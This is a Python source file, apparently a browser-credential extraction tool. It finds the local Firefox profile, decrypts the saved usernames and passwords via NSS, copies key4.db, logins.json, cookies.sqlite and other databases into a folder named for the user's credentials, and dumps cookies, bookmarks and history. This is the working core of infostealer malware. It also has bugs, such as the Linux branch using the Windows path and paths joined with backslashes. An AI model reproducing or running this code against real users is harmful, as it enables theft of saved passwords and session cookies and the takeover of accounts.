import os
from platform import system
from decrypt import NSS3
import json,sqlite3
from shutil import copy2
from datetime import datetime
username=os.getlogin()
WINDOWS_PATH=f"C:\\Users\\{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"
LINUX_PATH="~/.mozilla/firefox/Profiles"
MAC_PATH="~/Library/Application Support/Firefox/Profiles"
class Extract:
    def __init__(self,browser="firefox",path=None):
        self.__browser=browser
        self.__current_os=system()
        if path is None:
            if self.__current_os=="Windows":
                self.path=WINDOWS_PATH
            elif self.__current_os=="Linux":
                self.path=WINDOWS_PATH
            elif self.__current_os=="Darwin":
                self.path=MAC_PATH
        else:
            self.path=path
    def password(self):
        match self.__browser:
            case "firefox":
                nss=NSS3(username)
                decrypted_creds=[]
                for i,j,k in self.encrypted_creds():
                    decrypted_creds.append((i,nss.PK11SDR_Decrypt(j),nss.PK11SDR_Decrypt(k)))
                return decrypted_creds
            case "all":
                raise NotImplementedError("Currently Firefox Password can be extracted")
    def encrypted_creds(self):
        profile_path=self.__getprofile_path()
        creds_path=f"{profile_path}\\logins.json"
        with open(creds_path) as f:
            logins=json.load(f).get("logins",[])
            creds=[[creds.get("hostname"),creds.get("encryptedUsername"),creds.get("encryptedPassword")]for creds in logins]
        return creds
    def __getprofile_path(self):
        for folder in os.listdir(self.path):
            full_path=os.path.join(self.path,folder)
            if os.path.isdir(full_path) and os.path.exists(os.path.join(full_path,"logins.json"))and os.path.exists(os.path.join(full_path,"key4.db")):
                return full_path
        raise FileNotFoundError("No Valid FireFox Profiles Found")
    
    def copyto(self,output_dir:str):
        profile_path=self.__getprofile_path()
        creds_paths=map(lambda x:os.path.join(profile_path,x),["key4.db","logins.json","cookies.sqlite","places.sqlite","cert9.db"])
        destination_folder=f"{output_dir}\\{username}_credentials"
        if not os.path.exists(destination_folder):
            os.mkdir(destination_folder)
        for file in creds_paths:
            if os.path.exists(file):
                copy2(file,destination_folder)
                print(f"File {file} Copied to {output_dir}\\{destination_folder}")
            else:
                print(f"No File named {file}")
    def cookies(self):
        cookie_path = os.path.join(self.__getprofile_path(), "cookies.sqlite")
        print(f"Cookie DB path: {cookie_path}")
        if os.path.exists(cookie_path):
            connection = sqlite3.connect(cookie_path)
            cur = connection.cursor()
            
            # Check if moz_cookies table exists
            cur.execute("SELECT name FROM sqlite_master WHERE type='table';")
            tables = [row[0] for row in cur.fetchall()]
            if "moz_cookies" not in tables:
                connection.close()
                raise Exception("Table 'moz_cookies' not found in cookies.sqlite! Available tables: " + ", ".join(tables))
            
            # Fetch actual cookie data -- these are the main fields
            cur.execute("SELECT host, path, isSecure, name, value, expiry FROM moz_cookies")
            cookies = cur.fetchall()
            connection.close()
            return cookies
        else:
            raise FileNotFoundError("No cookies.sqlite found at determined profile path.")
    def bookmarks(self):
        """Return a list of (title, url) tuples for all bookmarks."""
        profile_path = self.__getprofile_path()
        db_path = os.path.join(profile_path, "places.sqlite")
        results = []
        if os.path.exists(db_path):
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            cursor.execute("""
                SELECT moz_bookmarks.title, moz_places.url
                FROM moz_bookmarks
                JOIN moz_places ON moz_bookmarks.fk = moz_places.id
                WHERE moz_bookmarks.type = 1 AND moz_places.url IS NOT NULL
            """)
            results = cursor.fetchall()
            conn.close()
        else:
            raise FileNotFoundError("places.sqlite not found in profile directory.")
        return results
    def history(self, limit=20):
        """Return a list of (title, url, visit_count, last_visit_date) for recent history."""
        profile_path = self.__getprofile_path()
        db_path = os.path.join(profile_path, "places.sqlite")
        results = []
        if os.path.exists(db_path):
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            cursor.execute(f"""
                SELECT title, url, visit_count, last_visit_date
                FROM moz_places
                WHERE url IS NOT NULL
                ORDER BY last_visit_date DESC
                LIMIT ?
            """, (limit,))
            # Convert Firefox timestamp (microseconds since epoch) to human-readable date
            for title, url, visits, last_visit in cursor.fetchall():
                if last_visit:  # sometimes last_visit_date can be None
                    last_visit_str = datetime.fromtimestamp(last_visit / 1e6).strftime('%Y-%m-%d %H:%M:%S')
                else:
                    last_visit_str = "Never"
                results.append((title, url, visits, last_visit_str))
            conn.close()
        else:
            raise FileNotFoundError("places.sqlite not found in profile directory.")
        return results
